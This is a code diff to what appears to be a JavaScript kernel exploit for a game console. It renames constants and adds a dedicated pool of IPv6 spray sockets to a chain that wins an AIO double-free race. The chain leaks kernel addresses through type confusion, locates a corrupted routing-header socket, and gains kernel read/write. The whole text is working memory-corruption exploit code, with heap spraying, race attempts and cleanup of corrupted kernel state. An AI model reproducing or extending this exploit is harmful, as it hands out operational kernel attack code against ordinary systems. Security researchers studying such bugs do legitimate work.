@@ -1,10 +1,11 @@
 //#region Variables
 const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
-const WORKER_NUM = 2;
-const SPRAY_NUM = 0x200;
-const ATTEMPT_NUM = 0x80;
-const HANDLES_NUM = 0x100;
-const IPV6_SOCK_NUM = 0x80;
+const NUM_WORKER = 2;
+const NUM_SPRAY = 0x200;
+const NUM_ATTEMPT = 0x80;
+const NUM_HANDLES = 0x100;
+const NUM_IPV6_SOCK = 0x80;
+const NUM_SPRAY_SOCK = 0x20;
 //#endregion
 //#region Contants
 const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
@@ -26,9 +27,10 @@ const AIO_STATE_ABORTED = 4;
 const block_ss = new Array(2);
 const rthdr_twins = new Array(2);
 const pktopts_twins = new Array(2);
-const ipv6_socks = new Array(IPV6_SOCK_NUM);
-const spray_ids = new Uint32Array(SPRAY_NUM);
-const block_ids = new Uint32Array(WORKER_NUM);
+const ipv6_socks = new Array(NUM_IPV6_SOCK);
+const spray_socks = new Array(NUM_SPRAY_SOCK);
+const spray_ids = new Uint32Array(NUM_SPRAY);
+const block_ids = new Uint32Array(NUM_WORKER);
 const outs = new Uint32Array(AIO_MAX_NUM);
 
 let race_worker = undefined;
@@ -219,7 +221,7 @@ function verify_reqs2(aio_entry) {
 }
 
 function find_rthdr_twins() {
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     for (let j = 0; j < ipv6_socks.length; j++) {
       const marker = (j << 0x10) | 0x1337;
 
@@ -268,7 +270,7 @@ function make_pktopts_twins() {
   const tclass_len_addr = mem.alloc(4);
 
   let overwritten = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     for (let j = 0; j < ipv6_socks.length; j++) {
       if (fn.setsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0) === -1) {
         throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[j]} !!`);
@@ -360,6 +362,11 @@ function init() {
     ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
   }
 
+  // Setup sockets for overwriting AIO entry
+  for (let i = 0; i < spray_socks.length; i++) {
+    spray_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
+  }
+
   logger.info('Environment init completed !!');
 }
 
@@ -386,6 +393,16 @@ function cleanup() {
   }
 
   for (const fd of ipv6_socks) {
+    if (!Number.isFinite(fd) || fd === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(fd) === -1) {
+      throw new SyscallError(`Unable to close fd ${fd} !!`);
+    }
+  }
+
+  for (const fd of spray_socks) {
     if (!Number.isFinite(fd) || fd === 0) {
       continue;
     }
@@ -434,9 +451,9 @@ function setup() {
 
   logger.info('Block AIO...');
 
-  build_reqs1(WORKER_NUM, block_ss[0]);
+  build_reqs1(NUM_WORKER, block_ss[0]);
 
-  spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, WORKER_NUM, block_ids);
+  spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_WORKER, block_ids);
   logger.debug(`block_ids: ${block_ids.hex()}`);
 
   logger.info('Spray AIO...');
@@ -491,7 +508,7 @@ async function double_free_reqs2() {
   client_linger.l_linger = 1;
 
   let won_race = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     logger.debug('Attempt AIO double free race...');
 
     const client_sock = make_socket(AF_INET, SOCK_STREAM);
@@ -622,8 +639,8 @@ function leak_kaddrs() {
   // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
   // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
   let leaked = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
-    const evfs = new Array(HANDLES_NUM);
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
+    const evfs = new Array(NUM_HANDLES);
 
     for (let i = 0; i < evfs.length; i++) {
       const marker = (i << 0x10) | 0xf00;
@@ -698,7 +715,7 @@ function leak_kaddrs() {
 
   // allocate reqs1 arrays at 0x100 kmalloc zone
   const num_reqs = Math.floor(0x100 / SceKernelAioRWRequest.sizeof);
-  const leak_ids = new Uint32Array(num_reqs * HANDLES_NUM);
+  const leak_ids = new Uint32Array(num_reqs * NUM_HANDLES);
 
   build_reqs1(num_reqs);
 
@@ -732,7 +749,7 @@ function leak_kaddrs() {
 
   let reqs2;
   leaked = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids);
 
     // out of bound read on adjacent malloc 0x80 memory
@@ -822,7 +839,7 @@ function double_free_reqs1() {
   fn.evf_delete.invoke(evf);
 
   let leaked = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, aio_ids);
 
     const len = get_rthdr(rthdr_twins[0], 0x800);
@@ -867,8 +884,8 @@ function double_free_reqs1() {
 
   let req_id;
   let overwritten = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
-    for (const sock of ipv6_socks) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
+    for (const sock of spray_socks) {
       set_rthdr(sock);
     }
 
@@ -928,15 +945,6 @@ function double_free_reqs1() {
   // we reclaim first since the sanity checking here is longer which makes it
   // more likely that we have another process claim the memory
   try {
-    if (version.console === 5) {
-      logger.info('Looking for rthdr twins... !!');
-
-      // RESTORE: double freed 0x80 block has been reclaimed with harmless data
-      find_rthdr_twins();
-
-      logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
-    }
-
     logger.info('Make pktopts twins...');
 
     // RESTORE: double freed memory has been reclaimed with harmless data
@@ -963,6 +971,39 @@ function double_free_reqs1() {
       throw new Error('Bad delete of ID pair');
     }
   }
+
+  const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);
+
+  let found = false;
+  for (let i = 0; i < spray_socks.length; i++) {
+    get_rthdr(spray_socks[i], 0x80);
+
+    if (leak_aio_entry.ar2_ticket === 4) {
+      logger.info(`Found dirty rthdr: ${spray_socks[i]} !!`);
+
+      rthdr_twins[0] = spray_socks[i];
+      logger.debug(`dirty_fd: ${rthdr_twins[0]}`);
+
+      found = true;
+
+      // remove dirty from list
+      spray_socks.splice(i, 1);
+
+      // free rthdr from rest of sockets
+      for (const sock of spray_socks) {
+        free_rthdr(sock);
+      }
+
+      // replace dirty with new socket
+      spray_socks.push(make_socket(AF_INET6, SOCK_DGRAM));
+
+      break;
+    }
+  }
+
+  if (!found) {
+    throw new Error('Unable to find dirty rthdr !!');
+  }
 }
 
 function make_karw() {
@@ -987,7 +1028,7 @@ function make_karw() {
   const tclass_len_addr = mem.alloc(4);
 
   let overwritten = false;
-  for (let i = 0; i < ATTEMPT_NUM; i++) {
+  for (let i = 0; i < NUM_ATTEMPT; i++) {
     for (let i = 0; i < ipv6_socks.length; i++) {
       // if a socket doesn't have a pktopts, setting the rthdr will make
       // one. the new pktopts might reuse the memory instead of the
@@ -1155,10 +1196,7 @@ async function exploit_main() {
 
     // Remove rthdr pointers
     remove_rthdr_from_so(pktopts_twins[1]);
-
-    if (version.console === 5) {
-      remove_rthdr_from_so(rthdr_twins[0]);
-    }
+    remove_rthdr_from_so(rthdr_twins[0]);
 
     logger.info('Corrupted context cleanup completed !!');
   } finally {
